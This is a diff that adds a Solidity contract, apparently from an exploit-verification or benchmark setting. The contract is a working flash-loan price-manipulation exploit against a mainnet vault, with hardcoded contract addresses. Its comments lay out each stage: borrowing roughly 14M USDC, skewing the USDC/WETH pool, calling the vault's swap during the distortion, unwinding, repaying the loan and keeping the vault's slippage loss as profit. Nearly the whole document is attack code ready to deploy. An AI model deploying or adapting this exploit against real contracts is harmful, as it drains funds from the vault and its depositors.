@@ -1,0 +1,228 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETHLike is IERC20Like {
+    function deposit() external payable;
+}
+
+interface IDexRouterLike {
+    function uniswapV3SwapTo(
+        uint256 receiver,
+        uint256 amount,
+        uint256 minReturn,
+        uint256[] calldata pools
+    ) external payable returns (uint256 returnAmount);
+}
+
+interface IDRLVaultLike {
+    function swapToWETH(uint256 amount) external returns (uint256 amountOut);
+}
+
+interface IUniV3LikePool {
+    function swap(
+        address recipient,
+        bool zeroForOne,
+        int256 amountSpecified,
+        uint160 sqrtPriceLimitX96,
+        bytes calldata data
+    ) external returns (int256 amount0, int256 amount1);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
+    address internal constant DEX_ROUTER = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
+    address internal constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
+    address internal constant VAULT = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;
+
+    // Deep Uniswap V2 USDC/USDT liquidity on mainnet. This only changes the funding
+    // leg: the exploit still borrows public liquidity, skews the relevant USDC/WETH
+    // market, triggers the vault mid-distortion, and then unwinds atomically.
+    address internal constant FLASHSWAP_PAIR = 0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f;
+
+    uint256 internal constant FLASHSWAP_USDC = 13_980_773_000_000;
+    uint256 internal constant VAULT_SWAP_USDC = 100_000_000_000;
+    uint256 internal constant FIRST_POOL_HINT =
+        14474011154664524427946373127366704448275315930774981940324572871603728323487;
+    uint256 internal constant SECOND_POOL_HINT =
+        57896044618658097711785492505624669893251560180390193455121166874571151938463;
+    uint256 internal constant FIRST_MIN_RETURN = 96069676420420156;
+    uint256 internal constant REVERSE_ETH_IN = 779999999999792152553;
+    uint160 internal constant FINAL_SQRT_PRICE_LIMIT_X96 =
+        1461446703485210103287273052203988822378723970341;
+
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+    bool internal _executed;
+
+    constructor() {
+        _profitToken = WETH;
+    }
+
+    function executeOnOpportunity() external {
+        require(!_executed, "already executed");
+        _executed = true;
+
+        uint256 startUsdc = IERC20Like(USDC).balanceOf(address(this));
+        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
+        uint256 startEth = address(this).balance;
+
+        _ensureApprovals();
+
+        if (startUsdc >= FLASHSWAP_USDC) {
+            _executePath(0);
+        } else {
+            // Stage 1: source enough capital to move the relevant USDC/WETH market.
+            // This is a realistic public on-chain funding step: borrow USDC from the
+            // deep Uniswap V2 pair and repay it atomically after the manipulated vault
+            // swap is unwound. The remaining steps preserve the same exploit causality.
+            IUniswapV2PairLike pair = IUniswapV2PairLike(FLASHSWAP_PAIR);
+            bool usdcIsToken0 = pair.token0() == USDC;
+            require(usdcIsToken0 || pair.token1() == USDC, "pair missing usdc");
+
+            pair.swap(
+                usdcIsToken0 ? FLASHSWAP_USDC : 0,
+                usdcIsToken0 ? 0 : FLASHSWAP_USDC,
+                address(this),
+                abi.encode(uint256(1))
+            );
+        }
+
+        _snapshotProfit(startUsdc, startWeth, startEth);
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(msg.sender == FLASHSWAP_PAIR, "only pair");
+        require(sender == address(this), "bad sender");
+        require(data.length != 0, "bad data");
+
+        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
+        require(borrowed == FLASHSWAP_USDC, "bad amounts");
+
+        uint256 repayment = _flashswapRepayment(borrowed);
+        _executePath(repayment);
+        _safeTransfer(USDC, FLASHSWAP_PAIR, repayment);
+    }
+
+    function _executePath(uint256 targetUsdcBalance) internal {
+        uint256 receiver = uint256(uint160(address(this)));
+        uint256[] memory pools = new uint256[](1);
+
+        // Stage 2: execute the large price-moving swap that distorts the live pool.
+        pools[0] = FIRST_POOL_HINT;
+        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo(receiver, FLASHSWAP_USDC, FIRST_MIN_RETURN, pools);
+
+        // Stage 3: trigger the vault while the manipulated price is still live.
+        IDRLVaultLike(VAULT).swapToWETH(VAULT_SWAP_USDC);
+
+        // Stage 4a: reverse the router leg of the manipulation.
+        pools[0] = SECOND_POOL_HINT;
+        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo{value: REVERSE_ETH_IN}(receiver, REVERSE_ETH_IN, 0, pools);
+
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance != 0) {
+            IWETHLike(WETH).deposit{value: ethBalance}();
+        }
+
+        // Stage 4b: if the flashswap funding leg is active, convert only the exact
+        // additional WETH needed into USDC to cover deterministic V2 repayment. Any
+        // residual WETH remains as realized profit from the vault's slippage loss.
+        if (targetUsdcBalance != 0) {
+            uint256 currentUsdc = IERC20Like(USDC).balanceOf(address(this));
+            if (currentUsdc < targetUsdcBalance) {
+                uint256 shortfall = targetUsdcBalance - currentUsdc;
+                require(shortfall <= uint256(type(int256).max), "shortfall too large");
+                IUniV3LikePool(POOL).swap(
+                    address(this),
+                    false,
+                    -_toInt256(shortfall),
+                    FINAL_SQRT_PRICE_LIMIT_X96,
+                    hex""
+                );
+            }
+        }
+    }
+
+    function _flashswapRepayment(uint256 borrowed) internal pure returns (uint256) {
+        return ((borrowed * 1000) / 997) + 1;
+    }
+
+    function _ensureApprovals() internal {
+        IERC20Like(USDC).approve(TOKEN_APPROVE, type(uint256).max);
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        require(IERC20Like(token).transfer(to, amount), "transfer failed");
+    }
+
+    function _toInt256(uint256 value) internal pure returns (int256) {
+        require(value <= uint256(type(int256).max), "int overflow");
+        return int256(value);
+    }
+
+    function _positiveToUint256(int256 value) internal pure returns (uint256) {
+        require(value >= 0, "negative value");
+        return uint256(value);
+    }
+
+    function _snapshotProfit(uint256 startUsdc, uint256 startWeth, uint256 startEth) internal {
+        uint256 endUsdc = IERC20Like(USDC).balanceOf(address(this));
+        uint256 endWeth = IERC20Like(WETH).balanceOf(address(this));
+        uint256 endEth = address(this).balance;
+
+        uint256 usdcDelta = endUsdc > startUsdc ? endUsdc - startUsdc : 0;
+        uint256 wethDelta = endWeth > startWeth ? endWeth - startWeth : 0;
+        uint256 ethDelta = endEth > startEth ? endEth - startEth : 0;
+
+        _profitToken = WETH;
+        _profitAmount = wethDelta;
+
+        if (_profitAmount == 0 && usdcDelta != 0) {
+            _profitToken = USDC;
+            _profitAmount = usdcDelta;
+        }
+
+        if (_profitAmount == 0 && ethDelta != 0) {
+            _profitToken = address(0);
+            _profitAmount = ethDelta;
+        }
+    }
+
+    function uniswapV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
+        _payPool(amount1Delta);
+    }
+
+    function pancakeV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
+        _payPool(amount1Delta);
+    }
+
+    function _payPool(int256 amount1Delta) internal {
+        require(msg.sender == POOL, "only pool");
+        if (amount1Delta > 0) {
+            _safeTransfer(WETH, POOL, _positiveToUint256(amount1Delta));
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    receive() external payable {}
+}
